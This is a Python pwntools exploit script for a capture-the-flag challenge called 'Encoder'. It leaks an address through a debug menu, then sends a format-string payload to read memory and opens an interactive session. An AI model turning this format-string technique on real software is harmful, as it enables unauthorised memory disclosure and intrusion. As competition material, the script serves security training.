#!/usr/bin/env python
from pwn import *
import sys

HOST = 'None'
PORT = None

def info(s):
	log.info(s)

def exploit(p):
	p.sendlineafter('Your choice','4')
	p.recvuntil('Debug mode is enabled.')
	p.recvline()
	l=int(p.recvline()[:-1],16)
	info("l is %x"%l)
	p.sendlineafter('Your choice','2')
	payload=('%12$s'.encode('hex')).ljust(16,'\x00')+p64(l)
	p.sendlineafter("Enter your message:",payload)
	p.interactive()
	return

if __name__=="__main__":

	if len(sys.argv)<2:
		p=process('/home/khongtrang/share/2018/svattt18/quals/pwn/Encoder')
		print util.proc.pidof(p)
		exploit(p)

	else:
		p=remote(HOST,PORT)
		exploit(p)
